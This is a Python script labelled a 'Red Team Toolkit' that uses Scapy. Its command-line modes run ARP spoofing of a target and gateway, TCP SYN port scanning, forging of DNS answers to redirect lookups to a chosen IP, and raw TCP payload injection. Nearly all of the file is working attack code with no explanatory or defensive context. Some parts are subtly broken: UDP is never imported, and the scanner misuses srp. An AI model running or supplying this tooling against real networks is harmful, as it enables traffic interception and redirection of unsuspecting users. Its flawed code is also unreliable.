#!/usr/bin/env python3
import argparse
import time
import threading
from scapy.all import ARP, Ether, srp, send, IP, TCP, DNS, DNSQR, DNSRR, sniff, sendp, Raw

# --- ARP Spoofer ---
def arp_spoof(target_ip, gateway_ip, iface):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    if not target_mac or not gateway_mac:
        print("[!] Could not find MAC addresses")
        return
    print(f"[*] Spoofing {target_ip} pretending to be {gateway_ip}")
    try:
        while True:
            send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac), iface=iface, verbose=0)
            send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac), iface=iface, verbose=0)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Stopping spoof. Restoring ARP...")
        restore_arp(target_ip, gateway_ip, target_mac, gateway_mac)

def get_mac(ip):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=0)
    for _, rcv in ans:
        return rcv[Ether].src
    return None

def restore_arp(target_ip, gateway_ip, target_mac, gateway_mac):
    send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5, verbose=0)
    send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5, verbose=0)

# --- TCP Port Scanner ---
def tcp_scan(target, ports):
    print(f"[*] Scanning {target} on ports {ports}")
    for port in ports:
        pkt = IP(dst=target)/TCP(dport=port, flags="S")
        resp = srp(Ether()/pkt, timeout=1, verbose=0)[0]
        for _, r in resp:
            if r.haslayer(TCP) and r[TCP].flags == 0x12:
                print(f"[+] Port {port} is open on {target}")

# --- DNS Spoofer ---
def dns_spoof(pkt, spoof_ip):
    if pkt.haslayer(DNSQR) and pkt.getlayer(DNS).qd.qtype == 1:
        spoofed = IP(dst=pkt[IP].src, src=pkt[IP].dst)/ \
                  UDP(dport=pkt[UDP].sport, sport=53)/ \
                  DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                      an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=spoof_ip))
        send(spoofed, verbose=0)
        print(f"[!] Spoofed DNS response sent to {pkt[IP].src} for {pkt[DNS].qd.qname.decode()}")

def start_dns_spoof(spoof_ip, iface):
    sniff(filter="udp port 53", prn=lambda pkt: dns_spoof(pkt, spoof_ip), iface=iface)

# --- Packet Injector ---
def inject_packet(dst_ip, dst_port, payload):
    packet = IP(dst=dst_ip)/TCP(dport=dst_port)/Raw(load=payload)
    send(packet, verbose=1)
    print(f"[+] Injected payload to {dst_ip}:{dst_port}")

# --- CLI ---
def main():
    parser = argparse.ArgumentParser(description="Red Team Toolkit")
    subparsers = parser.add_subparsers(dest="mode", help="Select a mode")

    # ARP Spoofing
    arp_parser = subparsers.add_parser("arp", help="ARP Spoofing")
    arp_parser.add_argument("--target", required=True, help="Target IP")
    arp_parser.add_argument("--gateway", required=True, help="Gateway IP")
    arp_parser.add_argument("--iface", required=True, help="Interface")

    # TCP Scanner
    scan_parser = subparsers.add_parser("scan", help="TCP SYN Port Scanner")
    scan_parser.add_argument("--target", required=True, help="Target IP")
    scan_parser.add_argument("--ports", nargs="+", type=int, required=True, help="Ports to scan")

    # DNS Spoofing
    dns_parser = subparsers.add_parser("dns", help="DNS Spoofing")
    dns_parser.add_argument("--spoof-ip", required=True, help="IP to spoof DNS replies with")
    dns_parser.add_argument("--iface", required=True, help="Interface to sniff on")

    # Packet Injection
    inject_parser = subparsers.add_parser("inject", help="Raw Packet Injection")
    inject_parser.add_argument("--dst-ip", required=True, help="Destination IP")
    inject_parser.add_argument("--dst-port", required=True, type=int, help="Destination Port")
    inject_parser.add_argument("--payload", required=True, help="Payload data")

    args = parser.parse_args()

    if args.mode == "arp":
        arp_spoof(args.target, args.gateway, args.iface)
    elif args.mode == "scan":
        tcp_scan(args.target, args.ports)
    elif args.mode == "dns":
        start_dns_spoof(args.spoof_ip, args.iface)
    elif args.mode == "inject":
        inject_packet(args.dst_ip, args.dst_port, args.payload)
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
